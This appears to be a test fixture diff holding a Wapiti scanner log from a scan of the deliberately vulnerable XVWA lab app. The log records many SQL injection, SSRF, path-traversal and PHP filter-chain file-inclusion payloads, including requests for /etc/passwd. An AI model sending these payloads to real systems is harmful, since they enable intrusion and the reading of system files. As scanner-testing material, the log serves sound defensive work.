+2024-03-20 15:24:12.585 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:12.585 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%C2%BF%27%22%28&search=
+2024-03-20 15:24:12.595 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=fuzz%C2%BF%27%22%28
+2024-03-20 15:24:12.619 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%20AND%2021%3D40%20AND%2082%3D82&search=
+2024-03-20 15:24:12.635 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%27%20AND%2040%3D59%20AND%20%2785%27%3D%2785&search=
+2024-03-20 15:24:12.653 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%22%20AND%2013%3D82%20AND%20%2266%22%3D%2266&search=
+2024-03-20 15:24:12.668 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%29%20AND%2012%3D42%20AND%20%2838%3D38&search=
+2024-03-20 15:24:12.686 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%27%29%20AND%2028%3D68%20AND%20%28%2782%27%3D%2782&search=
+2024-03-20 15:24:12.704 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%22%29%20AND%2038%3D119%20AND%20%28%2236%22%3D%2236&search=
+2024-03-20 15:24:12.721 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%20AND%2022%3D65%20AND%2085%3D85
+2024-03-20 15:24:12.740 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%20AND%2069%3D88%20AND%2023%3D23
+2024-03-20 15:24:12.764 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%20AND%2094%3D94%20AND%2093%3D93
+2024-03-20 15:24:12.787 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27%20AND%2087%3D123%20AND%20%2786%27%3D%2786
+2024-03-20 15:24:12.810 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27%20AND%2031%3D93%20AND%20%2752%27%3D%2752
+2024-03-20 15:24:12.829 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27%20AND%2072%3D72%20AND%20%2790%27%3D%2790
+2024-03-20 15:24:12.851 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22%20AND%2023%3D89%20AND%20%2227%22%3D%2227
+2024-03-20 15:24:12.871 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22%20AND%2058%3D115%20AND%20%2298%22%3D%2298
+2024-03-20 15:24:12.891 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22%20AND%2038%3D38%20AND%20%2266%22%3D%2266
+2024-03-20 15:24:12.921 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%29%20AND%2040%3D128%20AND%20%2899%3D99
+2024-03-20 15:24:12.958 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%29%20AND%2034%3D94%20AND%20%2890%3D90
+2024-03-20 15:24:12.993 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%29%20AND%2037%3D37%20AND%20%2892%3D92
+2024-03-20 15:24:13.030 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27%29%20AND%2048%3D80%20AND%20%28%2764%27%3D%2764
+2024-03-20 15:24:13.054 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27%29%20AND%2079%3D153%20AND%20%28%2724%27%3D%2724
+2024-03-20 15:24:13.077 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%27%29%20AND%2060%3D60%20AND%20%28%2737%27%3D%2737
+2024-03-20 15:24:13.095 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22%29%20AND%2010%3D90%20AND%20%28%2214%22%3D%2214
+2024-03-20 15:24:13.114 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22%29%20AND%2022%3D117%20AND%20%28%2247%22%3D%2247
+2024-03-20 15:24:13.137 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=%22%29%20AND%2045%3D45%20AND%20%28%2241%22%3D%2241
+2024-03-20 15:24:13.167 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:13.167 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%C2%BF%27%22%28&item=10
+2024-03-20 15:24:13.183 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=default%C2%BF%27%22%28
+2024-03-20 15:24:13.208 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%20AND%2056%3D89%20AND%2046%3D46&item=10
+2024-03-20 15:24:13.226 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%27%20AND%2011%3D41%20AND%20%2767%27%3D%2767&item=10
+2024-03-20 15:24:13.244 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%22%20AND%2038%3D48%20AND%20%2280%22%3D%2280&item=10
+2024-03-20 15:24:13.268 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%29%20AND%2027%3D107%20AND%20%2819%3D19&item=10
+2024-03-20 15:24:13.292 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%27%29%20AND%2038%3D79%20AND%20%28%2713%27%3D%2713&item=10
+2024-03-20 15:24:13.314 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default%22%29%20AND%2019%3D37%20AND%20%28%2283%22%3D%2283&item=10
+2024-03-20 15:24:13.337 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%20AND%2097%3D119%20AND%2082%3D82
+2024-03-20 15:24:13.362 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%27%20AND%2095%3D154%20AND%20%2793%27%3D%2793
+2024-03-20 15:24:13.386 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%22%20AND%2052%3D151%20AND%20%2213%22%3D%2213
+2024-03-20 15:24:13.409 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%29%20AND%2032%3D105%20AND%20%2841%3D41
+2024-03-20 15:24:13.430 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%27%29%20AND%2031%3D83%20AND%20%28%2782%27%3D%2782
+2024-03-20 15:24:13.451 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10%22%29%20AND%2052%3D120%20AND%20%28%2258%22%3D%2258
+2024-03-20 15:24:13.494 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 15:24:13.504 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:13.519 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 15:24:13.560 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 15:24:13.571 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:13.581 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:13.582 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fbak6e2%2F1%2F6974656d%2F&search=
+2024-03-20 15:24:13.593 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fbak6e2%2F1%2F736561726368%2F
+2024-03-20 15:24:13.614 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:13.615 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fbak6e2%2F2%2F736561726368%2F&item=10
+2024-03-20 15:24:13.626 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (1)
+	data: search=default&item=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fbak6e2%2F2%2F6974656d%2F
+2024-03-20 15:24:13.653 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=bak6e2 for results, please wait...
+2024-03-20 15:24:15.864 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 15:24:15.879 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:15.879 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 15:24:15.879 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 15:24:15.917 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 15:24:15.982 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 15:24:15.998 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli/ (1)
+2024-03-20 15:24:16.011 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:16.015 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&search=
+2024-03-20 15:24:16.026 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&search=
+2024-03-20 15:24:16.038 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.050 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:16.065 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.075 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.085 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&search=
+2024-03-20 15:24:16.094 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&search=
+2024-03-20 15:24:16.105 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&search=
+2024-03-20 15:24:16.114 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.138 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&search=
+2024-03-20 15:24:16.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&search=
+2024-03-20 15:24:16.166 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&search=
+2024-03-20 15:24:16.177 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.187 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:16.206 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:16.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.227 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.239 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.258 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.270 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.281 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.291 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.304 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&search=
+2024-03-20 15:24:16.314 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.325 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:16.335 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:16.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:16.357 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.367 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:16.377 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:16.390 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
